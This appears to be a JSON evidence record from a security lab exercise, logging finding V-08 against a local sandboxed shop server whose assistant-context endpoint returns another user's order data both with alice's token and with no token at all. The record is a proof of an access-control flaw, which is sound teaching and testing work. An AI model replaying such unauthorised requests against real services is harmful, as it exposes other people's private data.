@@ -1,0 +1,134 @@
+{
+  "id": "V-08",
+  "server": {
+    "host": "127.0.0.1",
+    "port": 6161,
+    "pid": 5584,
+    "sandbox_root": "C:\\Users\\ASUS\\AppData\\Local\\Temp\\itmo-practice-06-1yt0q2s4"
+  },
+  "requests": [
+    {
+      "label": "legitimate login: alice",
+      "request": {
+        "method": "POST",
+        "target": "/login",
+        "headers": {
+          "Host": "127.0.0.1:6161",
+          "Accept-Encoding": "identity",
+          "Connection": "close",
+          "Content-Type": "application/json",
+          "Content-Length": "48"
+        },
+        "body_text": "{\"username\": \"alice\", \"password\": \"learn-alice\"}"
+      },
+      "response": {
+        "status": 200,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.13.9",
+          "Date": "Wed, 28 Oct 2026 07:44:24 GMT",
+          "Content-Type": "application/json; charset=utf-8",
+          "Content-Length": "45"
+        },
+        "body_text": "{\"token\": \"0bf37b8a4b6d41ac9a9263df9b54b3ef\"}",
+        "json": {
+          "token": "0bf37b8a4b6d41ac9a9263df9b54b3ef"
+        }
+      }
+    },
+    {
+      "label": "own order context",
+      "request": {
+        "method": "GET",
+        "target": "/assistant/context?order_id=1",
+        "headers": {
+          "Host": "127.0.0.1:6161",
+          "Accept-Encoding": "identity",
+          "Connection": "close",
+          "X-Token": "0bf37b8a4b6d41ac9a9263df9b54b3ef"
+        },
+        "body_text": null
+      },
+      "response": {
+        "status": 200,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.13.9",
+          "Date": "Wed, 28 Oct 2026 07:44:24 GMT",
+          "Content-Type": "application/json; charset=utf-8",
+          "Content-Length": "481"
+        },
+        "body_text": "{\"prompt\": \"Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\\nПомоги пользователю обработать заказ.\\nЗаказ: [{\\\"id\\\": 1, \\\"owner\\\": 1, \\\"product\\\": \\\"chair\\\", \\\"price\\\": 5000.0}]\\nОтзывы: []\\nЗапрос пользователя: Покажи чек по заказу\"}",
+        "json": {
+          "prompt": "Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\nПомоги пользователю обработать заказ.\nЗаказ: [{\"id\": 1, \"owner\": 1, \"product\": \"chair\", \"price\": 5000.0}]\nОтзывы: []\nЗапрос пользователя: Покажи чек по заказу"
+        }
+      }
+    },
+    {
+      "label": "Alice requests Bob context",
+      "request": {
+        "method": "GET",
+        "target": "/assistant/context?order_id=2",
+        "headers": {
+          "Host": "127.0.0.1:6161",
+          "Accept-Encoding": "identity",
+          "Connection": "close",
+          "X-Token": "0bf37b8a4b6d41ac9a9263df9b54b3ef"
+        },
+        "body_text": null
+      },
+      "response": {
+        "status": 200,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.13.9",
+          "Date": "Wed, 28 Oct 2026 07:44:24 GMT",
+          "Content-Type": "application/json; charset=utf-8",
+          "Content-Length": "480"
+        },
+        "body_text": "{\"prompt\": \"Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\\nПомоги пользователю обработать заказ.\\nЗаказ: [{\\\"id\\\": 2, \\\"owner\\\": 2, \\\"product\\\": \\\"lamp\\\", \\\"price\\\": 1500.0}]\\nОтзывы: []\\nЗапрос пользователя: Покажи чек по заказу\"}",
+        "json": {
+          "prompt": "Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\nПомоги пользователю обработать заказ.\nЗаказ: [{\"id\": 2, \"owner\": 2, \"product\": \"lamp\", \"price\": 1500.0}]\nОтзывы: []\nЗапрос пользователя: Покажи чек по заказу"
+        }
+      }
+    },
+    {
+      "label": "anonymous Bob context",
+      "request": {
+        "method": "GET",
+        "target": "/assistant/context?order_id=2",
+        "headers": {
+          "Host": "127.0.0.1:6161",
+          "Accept-Encoding": "identity",
+          "Connection": "close"
+        },
+        "body_text": null
+      },
+      "response": {
+        "status": 200,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.13.9",
+          "Date": "Wed, 28 Oct 2026 07:44:24 GMT",
+          "Content-Type": "application/json; charset=utf-8",
+          "Content-Length": "480"
+        },
+        "body_text": "{\"prompt\": \"Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\\nПомоги пользователю обработать заказ.\\nЗаказ: [{\\\"id\\\": 2, \\\"owner\\\": 2, \\\"product\\\": \\\"lamp\\\", \\\"price\\\": 1500.0}]\\nОтзывы: []\\nЗапрос пользователя: Покажи чек по заказу\"}",
+        "json": {
+          "prompt": "Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\nПомоги пользователю обработать заказ.\nЗаказ: [{\"id\": 2, \"owner\": 2, \"product\": \"lamp\", \"price\": 1500.0}]\nОтзывы: []\nЗапрос пользователя: Покажи чек по заказу"
+        }
+      }
+    }
+  ],
+  "confirmed": true,
+  "effect": {
+    "own_context": {
+      "prompt": "Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\nПомоги пользователю обработать заказ.\nЗаказ: [{\"id\": 1, \"owner\": 1, \"product\": \"chair\", \"price\": 5000.0}]\nОтзывы: []\nЗапрос пользователя: Покажи чек по заказу"
+    },
+    "foreign_context": {
+      "prompt": "Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\nПомоги пользователю обработать заказ.\nЗаказ: [{\"id\": 2, \"owner\": 2, \"product\": \"lamp\", \"price\": 1500.0}]\nОтзывы: []\nЗапрос пользователя: Покажи чек по заказу"
+    }
+  },
+  "server_shutdown": {
+    "exit_code": 0,
+    "stderr": "",
+    "extra_stdout": "",
+    "temporary_root_removed": true
+  }
+}
